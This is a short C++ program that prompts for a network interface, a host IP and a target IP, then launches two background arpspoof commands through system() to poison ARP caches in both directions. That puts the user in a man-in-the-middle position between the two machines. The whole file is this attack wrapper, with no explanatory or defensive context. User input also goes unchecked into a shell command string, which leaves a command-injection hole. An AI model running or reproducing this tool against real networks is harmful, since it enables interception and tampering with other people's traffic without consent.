#include<stdlib.h>
#include<iostream>
#include<string>
#include<string.h>
using namespace std;
int main(){
	string wir,host,ip,arp1,arp2;
	cout<<"wireless card:";
	cin>>wir;
	cout<<"host:";
	cin>>host;
	cout<<"target:";
	cin>>ip;
	arp1="arpspoof -i "+wir+" -t "+host+" "+ip+"&";
	arp2="arpspoof -i "+wir+" -t "+ip+" "+host+"&";
	char cstr[arp1.size() + 1];
    strcpy(cstr, arp1.c_str());
   	char cstr2[arp2.size() + 1];
    strcpy(cstr2, arp2.c_str());
	system(cstr);
	system(cstr2);
	return 0;
}
 
